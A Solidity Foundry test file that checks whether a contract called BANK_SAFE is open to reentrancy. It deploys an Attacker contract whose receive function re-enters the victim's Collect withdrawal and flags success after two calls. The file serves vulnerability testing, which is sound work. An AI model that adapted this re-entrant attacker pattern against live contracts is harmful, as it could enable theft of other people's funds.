
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import "../src/BANK_SAFE.sol";

contract TestReentrancyBANK_SAFE is Test {
    BANK_SAFE public _contractUnderTest;
    LogFile public _logFile;
    Attacker public _attacker;

    function setUp() public {
        _logFile = new LogFile();
        _contractUnderTest = new BANK_SAFE();
        
        _contractUnderTest.SetLogFile(address(_logFile));
        _contractUnderTest.SetMinSum(1);
        _contractUnderTest.Initialized();
        
        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        
        // --- 1. Constraints & Pitfall Avoidance ---
        // Constrain attackVal to be greater than MinSum (1) and small enough to avoid overflow when doubled.
        vm.assume(attackVal > 10 && attackVal < type(uint128).max);
        

        // --- 2. State Configuration (Pre-Condition) ---
        // State is already configured in setUp (MinSum, LogFile, Initialized).

        // --- 3. Funding ---
        
        // A. Fund the Victim
        vm.deal(address(_contractUnderTest), attackVal * 10); 
        
        // B. Fund the Attacker (redundancy)
        vm.deal(address(_attacker), attackVal * 10);

        // C. CRITICAL: Fund the Test Contract (address(this))
        vm.deal(address(this), attackVal * 10);

        
        // --- 4. Trigger Attack ---
        // We send 2 * attackVal to the attacker to allow it to deposit enough funds.
        // This is necessary in Solidity 0.8.x to prevent arithmetic underflow revert 
        // when the re-entrant calls finish and balances are updated.
        // By depositing 2x, we prove we can re-enter and withdraw 2x without reverting.
        _attacker.setupAttack{value: attackVal * 2}(attackVal);
        _attacker.attack(attackVal);

        // --- 5. Verify Success ---
        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}

    fallback() external payable {}
}

contract Attacker {
    BANK_SAFE public victim;
    
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public amount;

    constructor(address victimAddress) { 
        victim = BANK_SAFE(payable(victimAddress));
    }

    function setupAttack(uint256 val) public payable {
        amount = val;
        attackCallCount = 0;
        exploitSucceeded = false;
        
        // Deposit funds. We deposit 2 * val to ensure we have enough balance 
        // to cover both the initial call and the re-entrant call.
        victim.Deposit{value: val * 2}();
    }

    function attack(uint256 val) public {
        // Call the vulnerable function
        victim.Collect(val);

        // Verify Success Conditions
        // If we managed to call Collect twice (count >= 2) without reverting, reentrancy occurred.
        if (attackCallCount >= 2) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        attackCallCount++;
        if (attackCallCount < 2) {            
            // Re-enter the contract
            victim.Collect(amount);
        }
    }

    fallback() external payable {}
}
